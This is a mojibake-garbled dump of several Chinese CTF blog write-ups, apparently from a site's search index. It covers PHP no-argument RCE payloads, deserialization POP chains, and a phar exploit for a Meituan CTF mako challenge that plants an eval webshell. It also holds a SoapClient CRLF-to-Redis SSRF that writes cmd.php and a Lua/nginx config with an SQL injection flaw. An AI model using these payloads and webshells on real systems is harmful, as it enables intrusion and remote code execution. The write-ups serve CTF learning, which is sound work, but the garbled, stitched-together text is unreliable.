PHPå…·æœ‰æå¼ºçš„é²æ£’æ€§ç‰¹åˆ«è€æ“ï¼Œå°¤å…¶æ˜¯ä¼ªåè®®è¿™å—ã€‚1234567åŸpayload:php://filter/convert.base64-encode/resource=index.phpæˆ‘å¯ä»¥æ’â™‚ å…¥ä¸€äº›å¥‡æ€ªçš„ä¸œè¥¿php://filter/convert.base64-encode/114514/resource=index.phpæˆ‘å¯ä»¥å¤§å¤§å°å°php://FiLTer/convert.base64-encode/resource=index.php 4.æ— å‚å‘½ä»¤æ‰§è¡Œè¿™ç§å°±åŸºæœ¬æ²¡æ´»èƒ½æ•´äº†ï¼Œå·²ç»ååˆ†å›ºå®šä¸‹æ¥äº† 123456&lt;?phphighlight_file(__FILE__);if(';' === preg_replace('/[^\\W]+\\((?R)?\\)/', '', $_GET['code'])) { eval($_GET['code']);}?&gt; '/[^\\W]+\\((?R)?\\)/'çš„è§£é‡Š è¿™é‡Œä½¿ç”¨pregreplaceæ›¿æ¢åŒ¹é…åˆ°çš„å­—ç¬¦ä¸ºç©ºï¼Œ\\wåŒ¹é…å­—æ¯ã€æ•°å­—å’Œä¸‹åˆ’çº¿ï¼Œç­‰ä»·äº [^A-Za-z0-9]ï¼Œç„¶å(?R)?è¿™ä¸ªæ„æ€ä¸ºé€’å½’æ•´ä¸ªåŒ¹é…æ¨¡å¼ã€‚æ‰€ä»¥æ­£åˆ™çš„å«ä¹‰å°±æ˜¯åŒ¹é…æ— å‚æ•°çš„å‡½æ•°ï¼Œå†…éƒ¨å¯ä»¥æ— é™åµŒå¥—ç›¸åŒçš„æ¨¡å¼ï¼ˆæ— å‚æ•°å‡½æ•°ï¼‰ï¼Œå°†åŒ¹é…çš„æ›¿æ¢ä¸ºç©ºï¼Œåˆ¤æ–­å‰©ä¸‹çš„æ˜¯å¦åªæœ‰; ä»¥ä¸Šæ­£åˆ™è¡¨è¾¾å¼åªåŒ¹é…a(b(c()))æˆ–a()è¿™ç§æ ¼å¼ï¼Œä¸åŒ¹é…a(â€œ123â€)ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¼ å…¥çš„å€¼å‡½æ•°ä¸èƒ½å¸¦æœ‰å‚æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä½¿ç”¨æ— å‚æ•°çš„å‡½æ•°è¿›è¡Œæ–‡ä»¶è¯»å–æˆ–è€…å‘½ä»¤æ‰§è¡Œã€‚ ä¸€äº›æœ‰ç”¨çš„ä¸œè¥¿ 12345678910111213141516171819202122ç›®å½•æ“ä½œï¼šgetchwd() ï¼šå‡½æ•°è¿”å›å½“å‰å·¥ä½œç›®å½•ã€‚scandir() ï¼šå‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚dirname() ï¼šå‡½æ•°è¿”å›è·¯å¾„ä¸­çš„ç›®å½•éƒ¨åˆ†ã€‚chdir() ï¼šå‡½æ•°æ”¹å˜å½“å‰çš„ç›®å½•ã€‚æ•°ç»„ç›¸å…³çš„æ“ä½œï¼šend() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚next() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚prev() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚reset() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡ºã€‚each() - è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ã€‚array_shift() - åˆ é™¤æ•°ç»„ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›è¢«åˆ é™¤å…ƒç´ çš„å€¼ã€‚è¯»æ–‡ä»¶show_source() - å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºã€‚readfile() - è¾“å‡ºä¸€ä¸ªæ–‡ä»¶ã€‚highlight_file() - å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºã€‚file_get_contents() - æŠŠæ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­ã€‚readgzfile() - å¯ç”¨äºè¯»å–é gzip æ ¼å¼çš„æ–‡ä»¶ PAYLOAD è¯·æ±‚å¤´ 123GET /1.php?code=eval(end(getallheaders())); HTTP/1.1.....flag: system('id'); get_defined_vars() 1?code=eval(end(current(get_defined_vars())));&amp;flag=system('ls'); åˆ©ç”¨å…¨å±€å˜é‡è¿›RCE get_defined_vars()ï¼šè¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ï¼Œä¼šè¿”å› _GET,_POST, _COOKIE, _FILESå…¨å±€å˜é‡çš„å€¼ï¼Œè¿”å›æ•°ç»„é¡ºåºä¸ºget-&gt;post-&gt;cookie-&gt;filescurrentï¼šè¿”å›æ•°ç»„ä¸­çš„å½“å‰å•å…ƒï¼Œåˆå§‹æŒ‡å‘æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå•å…ƒï¼Œä¹Ÿå°±æ˜¯ä¼šè¿”å›$_GETå˜é‡çš„æ•°ç»„å€¼ 3.session_start() session_start()ï¼šå¯åŠ¨æ–°ä¼šè¯æˆ–è€…é‡ç”¨ç°æœ‰ä¼šè¯ï¼ŒæˆåŠŸå¼€å§‹ä¼šè¯è¿”å› TRUE ï¼Œåä¹‹è¿”å› FALSE,è¿”å›å‚æ•°ç»™session_id() session_id()ï¼šè·å–/è®¾ç½®å½“å‰ä¼šè¯ IDï¼Œè¿”å›å½“å‰ä¼šè¯IDã€‚ å¦‚æœå½“å‰æ²¡æœ‰ä¼šè¯ï¼Œåˆ™è¿”å›ç©ºå­—ç¬¦ä¸²ï¼ˆâ€â€ï¼‰ã€‚æ–‡ä»¶è¯»å– show_source(session_id(session_start())); var_dump(file_get_contents(session_id(session_start()))) highlight_file(session_id(session_start())); readfile(session_id(session_start()));æŠ“åŒ…ä¼ å…¥Cookie: PHPSESSID=(æƒ³è¯»çš„æ–‡ä»¶)å³å¯","link":"/2022/10/03/RCE/"},{"title":"DasCTF åæœˆæœˆèµ›å¤ç°","text":"å¯„å¯„å¯„ï¼å››é“é¢˜ï¼Œä¸‰é“æˆ‘ä¸æ“…é•¿çš„ååºåˆ—åŒ–ï¼Œå¯„ï¼Œå½“æ—¶è¿˜è¦è€ƒè¯•å¤ä¹ ï¼Œç»“æœæ²¡å¤ªå¤šæ—¶é—´åšï¼Œéº»äº†éƒ½ã€‚ EasyPopè¿™é¢˜é“¾å­å¥½æ‰¾ï¼Œä¹Ÿå¾ˆå¿«å°±æ‰¾åˆ°äº†ï¼Œä½†é—®é¢˜å°±åœ¨äºæœ€åä¸€æ­¥å¦‚ä½•ç»•è¿‡__wakeupï¼Œéº»äº†ï¼Œæˆ‘å°±å¡åœ¨è¿™é‡Œäº†â€¦â€¦.PHPåºåˆ—åŒ–å†·çŸ¥è¯† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103&lt;?phphighlight_file(__FILE__);error_reporting(0);class fine{private $cmd;private $content;public function __construct($cmd, $content){$this-&gt;cmd = $cmd;$this-&gt;content = $content;}public function __invoke(){call_user_func($this-&gt;cmd, $this-&gt;content);}public function __wakeup(){$this-&gt;cmd = &quot;&quot;;die(&quot;Go listen to Jay Chou's secret-code! Really nice&quot;);}}class show{public $ctf;public $time = &quot;Two and a half years&quot;;public function __construct($ctf){$this-&gt;ctf = $ctf;}public function __toString(){return $this-&gt;ctf-&gt;show();}public function show(): string{return $this-&gt;ctf . &quot;: Duration of practice: &quot; . $this-&gt;time;}}class sorry{private $name;private $password;public $hint = &quot;hint is depend on you&quot;;public $key;public function __construct($name, $password){$this-&gt;name = $name;$this-&gt;password = $password;}public function __sleep(){$this-&gt;hint = new secret_code();}public function __get($name){$name = $this-&gt;key;$name();}public function __destruct(){if ($this-&gt;password == $this-&gt;name) {echo $this-&gt;hint;} else if ($this-&gt;name = &quot;jay&quot;) {secret_code::secret();} else {echo &quot;This is our code&quot;;}}public function getPassword(){return $this-&gt;password;}public function setPassword($password): void{$this-&gt;password = $password;}}class secret_code{protected $code;public static function secret(){include_once &quot;hint.php&quot;;hint();}public function __call($name, $arguments){$num = $name;$this-&gt;$num();}private function show(){return $this-&gt;code-&gt;secret;}}if (isset($_GET['pop'])) {$a = unserialize($_GET['pop']);$a-&gt;setPassword(md5(mt_rand()));} else {$a = new show(&quot;Ctfer&quot;);echo $a-&gt;show();} hade_waiboè¿›æ¥ä¸€çœ‹ï¼Œcancan needä»»æ„æ–‡ä»¶è¯»å–ï¼ŒæŠŠæ–‡ä»¶å…¨æ‰’ä¸‹æ¥ï¼Œæ ¸å¿ƒå®åœ¨class.phpé‡Œé¢ï¼Œè‚¯å®šæ˜¯pharååºåˆ—åŒ–ã€‚ä¹ä¸€çœ‹ï¼Œåˆè¦ç»•wakeupï¼Œä¸è¿‡è¿™ä¸€æ¬¡æœ‰å¼•ç”¨èµ‹å€¼ï¼Œå¯ä»¥ç»•ï¼Œå½“æ—¶æ²¡æ—¶é—´äº† 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475&lt;?phpclass User{ public $username; public function __construct($username){ $this-&gt;username = $username; $_SESSION['isLogin'] = True; $_SESSION['username'] = $username; } public function __wakeup(){ $cklen = strlen($_SESSION[&quot;username&quot;]); if ($cklen != 0 and $cklen &lt;= 6) { $this-&gt;username = $_SESSION[&quot;username&quot;]; } } public function __destruct(){ if ($this-&gt;username == '') { session_destroy(); } }}class File{ #æ›´æ–°é»‘åå•ä¸ºç™½åå•ï¼Œæ›´åŠ çš„å®‰å…¨ public $white = array(&quot;jpg&quot;,&quot;png&quot;); public function show($filename){ echo '&lt;div class=&quot;ui action input&quot;&gt;&lt;input type=&quot;text&quot; id=&quot;filename&quot; placeholder=&quot;Search...&quot;&gt;&lt;button class=&quot;ui button&quot; onclick=&quot;window.location.href=\\'file.php?m=show&amp;filename=\\'+document.getElementById(\\'filename\\').value&quot;&gt;Search&lt;/button&gt;&lt;/div&gt;&lt;p&gt;'; if(empty($filename)){die();} return '&lt;img src=&quot;data:image/png;base64,'.base64_encode(file_get_contents($filename)).'&quot; /&gt;'; } public function upload($type){ $filename = &quot;dasctf&quot;.md5(time().$_FILES[&quot;file&quot;][&quot;name&quot;]).&quot;.$type&quot;; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot; . $filename); return &quot;Upload success! Path: upload/&quot; . $filename; } public function rmfile(){ system('rm -rf /var/www/html/upload/*'); } public function check($type){ if (!in_array($type,$this-&gt;white)){ return false; } return true; }}#æ›´æ–°äº†ä¸€ä¸ªæ¶æ„åˆæœ‰è¶£çš„Testç±»class Test{ public $value; public function __destruct(){ chdir('./upload'); $this-&gt;backdoor(); } public function __wakeup(){ $this-&gt;value = &quot;Don't make dream.Wake up plz!&quot;; } public function __toString(){ $file = substr($_GET['file'],0,3); file_put_contents($file, &quot;Hack by $file !&quot;); return 'Unreachable! :)'; } public function backdoor(){ if(preg_match('/[A-Za-z0-9?$@]+/', $this-&gt;value)){ $this-&gt;value = 'nono~'; } system($this-&gt;value); }} å®˜æ–¹exp 123456789101112131415161718192021222324class User{public $username;}class Test{public $value;}$User = new User();$Test = new Test();$User-&gt;a = $Test;$User-&gt;username = &amp;$Test-&gt;value;echo serialize($User);#ç¬¬äºŒæ­¥ï¼Œéœ€è¦æŠŠnameæ”¹æˆ* /*// $Test-&gt;a = $User;// $User-&gt;username = $Test;// echo serialize($Test);#ç¬¬ä¸€æ­¥ï¼Œéœ€è¦æŠŠåå­—æ”¹æˆæ•°ç»„$phar = new \\Phar(&quot;h3ne1.phar&quot;);$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);$phar-&gt; addFromString('test.txt','h3en1');//$phar-&gt;setMetadata($Test);ç¬¬ä¸€æ­¥$phar-&gt;setMetadata($User);$phar-&gt;stopBuffering(); å› ä¸ºç»™å®éªŒå®¤çš„æ–°ç”Ÿé…webé¶æœºçš„dockerç¯å¢ƒï¼Œå½“æ—¶å°±é¡ºæ‰‹çœ‹çœ‹æœ‰æ²¡æœ‰start.shæˆ–è€…flag.shæ–‡ä»¶ï¼Œç„¶åå°±è¿˜çœŸæ‰¾åˆ°äº† äº‹å®è¯æ˜ï¼Œdockerè¿è¡Œä¹‹åï¼Œè¦åˆ é™¤çš„ä¸åªæœ‰ç¯å¢ƒå˜é‡ï¼Œè¿˜æœ‰è¿è¡Œçš„shè„šæœ¬ï¼Œè°¨é˜²éœ²ç‰›å­ start.sh 1234567#!/bin/shecho $FLAG &gt; /ghjsdk_F149_H3re_asdasfcexport FLAG=no_flagFLAG=no_flagapache2-foregroundrm -rf /flag.shtail -f /dev/null ç›´æ¥éœ²ç‰›å­äº†å§ EasyLoveå½“æ—¶æ€¥ç€å¤ä¹ ï¼Œè¿™é¢˜æˆ‘æ²¡çœ‹äº†â€¦.å¯„ 123456789101112131415161718192021222324252627282930313233343536 &lt;?phphighlight_file(__FILE__);error_reporting(0);class swpu{ public $wllm; public $arsenetang; public $l61q4cheng; public $love; public function __construct($wllm,$arsenetang,$l61q4cheng,$love){ $this-&gt;wllm = $wllm; $this-&gt;arsenetang = $arsenetang; $this-&gt;l61q4cheng = $l61q4cheng; $this-&gt;love = $love; } public function newnewnew(){ $this-&gt;love = new $this-&gt;wllm($this-&gt;arsenetang,$this-&gt;l61q4cheng); } public function flag(){ $this-&gt;love-&gt;getflag(); } public function __destruct(){ $this-&gt;newnewnew(); $this-&gt;flag(); }}class hint{ public $hint; public function __destruct(){ echo file_get_contents($this-&gt; hint.'hint.php'); }}$hello = $_GET['hello'];$world = unserialize($hello); è¿™å›é“¾å­å¾ˆçŸ­ï¼Œå…ˆçœ‹hint 1234567&lt;?phpclass hint{public $hint=&quot;php://filter/read=convert.base64-encode/resource=&quot;;}$a = new hint();echo serialize($a);?&gt; è·å¾—è´¦å·å¯†ç  123&lt;?php$hint = &quot;My favorite database is Redis and My favorite day is 20220311&quot;;? å¾ˆæ˜æ˜¾ï¼Œåˆ©ç”¨SoapClientè¿›è¡Œssrfç„¶åæ‰“redis å¯„ï¼Œè¿˜æ˜¯ä¸ä¼šè¿™é‡Œä¹Ÿçœ‹ä¸€ä¸‹æ€ä¹ˆæ‰“redis è¿™é‡Œæ¯”è¾ƒæœ‰è¶£çš„æ˜¯ï¼Œå½“æˆ‘ä»¬åˆ©ç”¨ssrfå‘rediså‘èµ·httpè¯·æ±‚æ—¶ï¼Œä½ç‰ˆæœ¬çš„Redisä¼šå°†è¯·æ±‚å¤´çš„å†…å®¹ä½œä¸ºrediså‘½ä»¤è§£æï¼Œé‚£ä¹ˆåªè¦æˆ‘ä»¬é€šè¿‡CRLFæ§åˆ¶ä½è¯·æ±‚å¤´ï¼Œå†é…åˆSoapClientå‘èµ·è¯·æ±‚å³å¯ï¼Œæ•…expå¦‚ä¸‹ï¼š 12345678910111213141516171819202122&lt;?php$target='http://127.0.0.1:6379/';$poc0=&quot;AUTH 20220311&quot;;$poc=&quot;CONFIG SET dir /var/www/html&quot;;$poc1=&quot;SET x '&lt;?@eval(\\$_POST[1]);?&gt;'&quot;;$poc2=&quot;CONFIG SET dbfilename cmd.php&quot;;$poc3=&quot;SAVE&quot;;$a = array('location' =&gt; $target,'uri' =&gt;'hello^^'.$poc0.'^^'.$poc.'^^'.$poc1.'^^'.$poc2.'^^'.$poc3.'^^hello');$aaa = serialize($a);$aaa = str_replace('^^',&quot;\\r\\n&quot;,$aaa);$c=unserialize($aaa);class swpu{public $wllm = 'SoapClient';public $arsenetang = null;public $l61q4cheng;public $love;}$a=new swpu();$a-&gt;l61q4cheng=$c;echo urlencode(serialize($a));?&gt; ç¡®å®è¦å­¦å­¦Rediså’‹ç”¨äº†ï¼Œè¿™éƒ½çœ‹ä¸æ‡‚ BlogSystemè¿™æ˜¯ä¸ªå¥½é¢˜ï¼Œæˆ‘æ…¢æ…¢å“ä¸€å“å†æ¥åš,å¤ªå¤šæ¶‰åŠåˆ°æˆ‘çŸ¥è¯†ç›²åŒºçš„ä¸œè¥¿äº†","link":"/2022/10/28/das10%E5%A4%8D%E7%8E%B0/"},{"title":"ç¾å›¢CTFå†³èµ›å¤ç° mako","text":"å¤ªèœäº†ï¼Œè¢«å¤§ä½¬å¸¦è¿›å†³èµ›äº†,æœ€åå°±ç­¾ä¸ªåˆ° ç¯å¢ƒå¯†ç :1skr ä¸‹é¢éƒ¨åˆ†æ˜¯æˆ‘åœ¨æ¯”èµ›çš„æ—¶å€™æ€è€ƒè¿‡çš„ 1.å¼€å§‹é¡µé¢ä¸€è¿›æ¥ï¼Œååˆ†çš„æ¸…çˆ½ï¼Œæ¯›éƒ½æ²¡æœ‰ï¼Œå°±ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„ä¸œè¥¿ éšä¾¿ä¼ ç‚¹ä¸œè¥¿ï¼Œå‘ç°æ˜¯æ¥è€…ä¸æ‹’ï¼Œå•¥éƒ½èƒ½ä¼ ï¼Œä½†å•¥éƒ½å¹²ä¸äº†è®¿é—®1.phpåªä¼šå‡ºç°404not foundè¿™æ˜¯æœ€ä»¤äººå¼‚æˆ–çš„ä¸€ç‚¹ å› ä¸ºé¢˜ç›®ç»™äº†dockerï¼Œå°±æœ¬åœ°éƒ¨ç½²ä¸€ä¸ªç¯å¢ƒï¼Œå…ˆè¿›å»çœ‹çœ‹æ–‡ä»¶éƒ½å­˜åˆ°äº†å“ªé‡Œå¯ä»¥çœ‹è§ï¼Œæ–‡ä»¶å¹¶æ²¡æœ‰è¢«ä¸Šä¼ åˆ°/var/www/html/è¿™ä¸ªç›®å½•ä¸‹é¢ è€Œæ–‡ä»¶è¢«ä¸Šä¼ åˆ°äº†/var/www/html/mako/uploadsè¿™ä¸ªç›®å½•ä¸‹ å¯ä»¥è‚¯å®šçš„æ˜¯ï¼Œæ–‡ä»¶ä¸Šä¼ æ˜¯æ•´ä¸äº†æ´»äº† 2.å®¡è®¡é€šè¿‡æœç´¢å…³é”®è¯ï¼Œåœ¨mako/app/reources/views/home.tpl.phpé‡Œæ‰¾åˆ°åˆ°äº†é¦–é¡µçš„æºç  å¾ˆæ˜æ˜¾ï¼Œè¿™æ˜¯ç”¨æ¨¡ç‰ˆæ¸²æŸ“å‡ºæ¥çš„ä¸»é¡µ, å›¾ç‰‡éƒ½æ˜¯ä»¥base64çš„ç¼–ç å½¢å¼ä¼ é€’çš„ï¼Œæ²¡æ´»æ•´äº†ã€‚ è¿™å°±å¾ˆä»¤äººè‹¦æ¼ï¼Œæˆ‘å½“æ—¶å°è¯•äº†ä¸€ä¸‹ï¼Œä½¿ç”¨è½¯é“¾æ¥ ç›´æ¥å¯„äº†ï¼Œæ²¡æƒé™ï¼Œè¿™æ—¶å€™æ‰æƒ³èµ·æ¥å®¹å™¨ä¸€å¼€å§‹å†™äº†ä¸€ä¸ªè¯»å–flagçš„ç¨‹åº ç›®æ ‡ä¹Ÿæ˜ç¡®äº†ï¼Œè‚¯å®šå¾—æƒ³åŠæ³•æ‰§è¡ŒreadFlagï¼Œäºæ˜¯æˆ‘æœäº†å±é™©å‡½æ•°ï¼Œç„¶åæ˜¯ä¸€æ— æ‰€è·ï¼Œè¦ä¹ˆæ²¡è¿™ä¸ªå‡½æ•°ï¼Œè¦ä¹ˆæ ¹æœ¬æ— æ³•è§¦å‘ åšåˆ°è¿™é‡Œï¼Œæˆ‘å·²ç»æ²¡æœ‰æ€è·¯äº†ï¼Œå½“æ—¶æƒ³åˆ°äº†ååºåˆ—åŒ–ï¼Œä½†æ˜¯åªçŸ¥é“æœunseralizeï¼Œç»“æœæ˜¯æ¯›éƒ½æ²¡æœåˆ°ã€‚ æˆ‘ç»éªŒå¤ªå°‘äº†ï¼Œå½“æ—¶æ²¡æƒ³åˆ°ç”¨phar 3.å¤ç°åœ¨mako/app/controllers/ImagesController.phpæ–‡ä»¶ä¸­ 123456789public function editGet(ViewFactory $view): string { chdir('/var/www/mako/uploads'); $fileName = $this-&gt;request-&gt;getQuery()-&gt;get('filename'); $image = new Image($fileName, new ImageMagick()); $dimensions = $image-&gt;getDimensions(); $this-&gt;view-&gt;assign('fileName', $fileName); $this-&gt;view-&gt;assign('dimensions', $dimensions); return $view-&gt;render('edit');} å¯ä»¥çœ‹åˆ°ï¼Œæ–‡ä»¶åæ˜¯ä¸åšä»»ä½•è¿‡æ»¤çš„ è€Œåœ¨mako/vendo/mako/framework/src/mako/pixl/image.phpä¸­ 1234567891011121314151617public function __construct($image, ProcessorInterface $processor){ $this-&gt;image = $image; $this-&gt;processor = $processor; // Make sure that the image exists if(file_exists($this-&gt;image) === false) { throw new PixlException(vsprintf('The image [ %s ] does not exist.', [$this-&gt;image])); } // Set the image $this-&gt;processor-&gt;open($image);} ä½¿ç”¨äº†èƒ½è§¦å‘pharååºåˆ—åŒ–çš„file_existså‡½æ•° å…³é”®å‡½æ•°æ‰¾åˆ°äº†ï¼Œç°åœ¨æ‰¾é“¾å­å§ æœç´¢__destruct(),å¹²æ‰°é¡¹ä¸å¤šï¼Œå¯ä»¥ç›´æ¥å¼€æ’¸ å¥½å®¶ä¼™ï¼Œæˆ‘ç›´æ¥å¥½å®¶ä¼™ï¼Œä¸€æ¡é¾™æœåŠ¡äº†å±äºæ˜¯qwq 4.æ”»å‡»è¿™é‡Œæ¬ä¸€æ‰‹Arr3stY0uæˆ˜é˜Ÿçš„pocå§ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?phpnamespace mako\\file{class FileSystem{}}namespace mako\\session\\stores{ use mako\\file\\FileSystem;class File{ protected $fileSystem; protected $sessionPath; public function __construct(){ $this-&gt;fileSystem = new FileSystem(); $this-&gt;sessionPath = '/var/www/mako/public/'; }}}namespace mako\\session{use mako\\session\\stores\\File;class Session{ protected $autoCommit; protected $destroyed = false; protected $sessionId; protected $sessionData = []; protected $store; public function __construct(){ $this-&gt;autoCommit = true; $this-&gt;destroyed = false; $this-&gt;store = new File(); $this-&gt;sessionId = 'shell.php'; $this-&gt;sessionData = ['a'=&gt;'&lt;?php eval($_POST[1]);?&gt;']; }}}namespace { $exp = new mako\\session\\Session(); $phar = new Phar('test.phar',0,'test.phar'); $phar-&gt;startBuffering(); $phar-&gt;setStub('&lt;?php __HALT_COMPILER(); ?&gt;'); $phar-&gt;setMetadata($exp); $phar-&gt;addFromString('text.txt','test'); $phar-&gt;stopBuffering();}; ä¸Šä¼ æ–‡ä»¶getshellflag is here 5.æ€»ç»“åæ€ç»éªŒä¸è¶³ï¼Œåšé¢˜ä¸å¤Ÿï¼Œæ¬ ç»ƒ","link":"/2022/09/30/mt-ctf/"},{"title":"","text":"web1web2web3robots.txtå‘ç°æ•æ„Ÿæ–‡ä»¶ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185//nginx.confhttp { include mime.types; default_type application/octet-stream; #log_format main '$remote_addr - $remote_user [$time_local] &quot;$request&quot; ' # '$status $body_bytes_sent &quot;$http_referer&quot; ' # '&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;'; #access_log logs/access.log main; sendfile on; keepalive_timeout 65; server { listen 80; #access_log logs/host.access.log main; location / { default_type text/html; root html; index index.html index.htm; access_by_lua_block { local mysql = require &quot;resty.mysql&quot; local db, err = mysql:new() if not db then -- ngx.say(&quot;failed to instantiate mysql: &quot;, err) return end local ok, err, errcode, sqlstate = db:connect{ path = &quot;/run/mysqld/mysqld.sock&quot;, database = &quot;app&quot;, user = &quot;root&quot;, password = &quot;hello&quot; } if not ok then -- ngx.say(&quot;failed to connect: &quot;, err, &quot;: &quot;, errcode, &quot; &quot;, sqlstate) return end local headers = ngx.req.get_headers() local ip = ngx.quote_sql_str(&quot;233.233.233.233&quot;) if headers[&quot;X-Forwarded-For&quot;] then ip = ngx.quote_sql_str(headers[&quot;X-Forwarded-For&quot;]) end uri = ngx.quote_sql_str(ngx.var.request_uri) local sql = &quot;INSERT INTO records(url, ip) VALUES (&quot; .. uri .. &quot;, &quot; .. ip .. &quot;)&quot; -- ngx.say(sql) res, err, errcode, sqlstate = db:query(sql) if not res then -- ngx.say(&quot;bad result: &quot;, err, &quot;: &quot;, errcode, &quot;: &quot;, sqlstate, &quot;.&quot;) return end -- local cjson = require &quot;cjson&quot; -- ngx.say(&quot;result: &quot;, ip, cjson.encode(uri)) } } location /cat-admin-panel/history { default_type text/html; content_by_lua_block { local mysql = require &quot;resty.mysql&quot; local db, err = mysql:new() if not db then -- ngx.say(&quot;failed to instantiate mysql: &quot;, err) return end local ok, err, errcode, sqlstate = db:connect{ path = &quot;/run/mysqld/mysqld.sock&quot;, database = &quot;app&quot;, user = &quot;root&quot;, password = &quot;hello&quot; } if not ok then -- ngx.say(&quot;failed to connect: &quot;, err, &quot;: &quot;, errcode, &quot; &quot;, sqlstate) return end local headers = ngx.req.get_headers() local ip = ngx.quote_sql_str(&quot;233.233.233.233&quot;) if headers[&quot;X-Forwarded-For&quot;] then ip = ngx.quote_sql_str(headers[&quot;X-Forwarded-For&quot;]) end local cjson = require &quot;cjson&quot; local user_mode = ngx.var.arg_user_mode local sql if user_mode == &quot;yes&quot; then res, err, errcode, sqlstate = db:query(&quot;SELECT * FROM users WHERE ip = &quot; .. ip) if not res[1] then return end local name = res[1][&quot;name&quot;] ngx.say(&quot;Your history:&lt;br&gt;&quot;) sql = &quot;SELECT records.url, users.name, users.ip FROM records, users WHERE users.name = '&quot;..name..&quot;' AND records.ip = users.ip&quot; else ngx.say(&quot;Site request history: &lt;br&gt;&quot;) sql = &quot;SELECT * FROM records&quot; end res, err, errcode, sqlstate = db:query(sql) if not res then -- ngx.say(&quot;bad result: &quot;, err, &quot;: &quot;, errcode, &quot;: &quot;, sqlstate, &quot;.&quot;) return end ngx.say(cjson.encode(res)) -- ngx.say(ngx.var.remote_addr) db:close() } } location /cat-admin-panel/register { default_type text/html; content_by_lua_block { local mysql = require &quot;resty.mysql&quot; local db, err = mysql:new() if not db then -- ngx.say(&quot;failed to instantiate mysql: &quot;, err) return end local ok, err, errcode, sqlstate = db:connect{ path = &quot;/run/mysqld/mysqld.sock&quot;, database = &quot;app&quot;, user = &quot;root&quot;, password = &quot;hello&quot; } if not ok then -- ngx.say(&quot;failed to connect: &quot;, err, &quot;: &quot;, errcode, &quot; &quot;, sqlstate) return end local headers = ngx.req.get_headers() local ip = ngx.quote_sql_str(&quot;233.233.233.233&quot;) if headers[&quot;X-Forwarded-For&quot;] then ip = ngx.quote_sql_str(headers[&quot;X-Forwarded-For&quot;]) end local cjson = require &quot;cjson&quot; local user = ngx.var.arg_user ngx.say(&quot;Your IP: &quot;, ip) ngx.say(&quot;Your name: &quot;, user) if user then res, err, errcode, sqlstate = db:query(&quot;INSERT INTO users(name, ip) VALUES (&quot;.. ngx.quote_sql_str(user) ..&quot;,&quot;.. ip ..&quot;)&quot;) if not res then -- ngx.say(&quot;bad result: &quot;, err, &quot;: &quot;, errcode, &quot;: &quot;, sqlstate, &quot;.&quot;) return end else ngx.say(&quot;Who?&quot;) return end db:close() } } }}","link":"/2022/11/26/hitctf/"},{"title":"SQLæ³¨å…¥å­¦ä¹ å¯„å½•","text":"0x01 SQLSQL æ˜¯ä¸€ç§æ ‡å‡†SQL æ˜¯ä¸€é—¨ ANSIï¼ˆAmerican National Standards Institute ç¾å›½å›½å®¶æ ‡å‡†åŒ–ç»„ç»‡ï¼‰æ ‡å‡†çš„è®¡ç®—æœºè¯­è¨€ï¼Œä½†æ˜¯ä»ç„¶å­˜åœ¨ç€å¤šç§ä¸åŒç‰ˆæœ¬çš„ SQL è¯­è¨€ã€‚ åº“&amp;è¡¨ä¸€ä¸ªæ•°æ®åº“é€šå¸¸åŒ…æ‹¬ä¸€ä¸ªæˆ–å¤šä¸ªè¡¨ã€‚æ¯ä¸ªè¡¨éƒ½æœ‰ä¸€ä¸ªåå­—æ ‡è¯†ï¼Œè¡¨åŒ…å«å¸¦æœ‰æ•°æ®çš„è®°å½•ã€‚ SQL åŸºç¡€è¯­æ³•æœ€ç®€å•çš„æŸ¥è¯¢SELECT * FROM è¡¨å è¿™ä¸ªè¯­å¥ä¼šæŠŠå½“å‰è¡¨ä¸‹æ‰€æœ‰çš„æ•°æ®å…¨éƒ½åˆ—å‡ºæ¥ï¼Œåœ¨æ•°æ®é‡æ¯”è¾ƒå°çš„æ—¶å€™ä¼šå¾ˆå¥½ç”¨ï¼Œä½†å½“æ•°æ®é‡ç‰¹åˆ«å¤§çš„æ—¶å€™å°±å®¹æ˜“è¢«ä¸€å 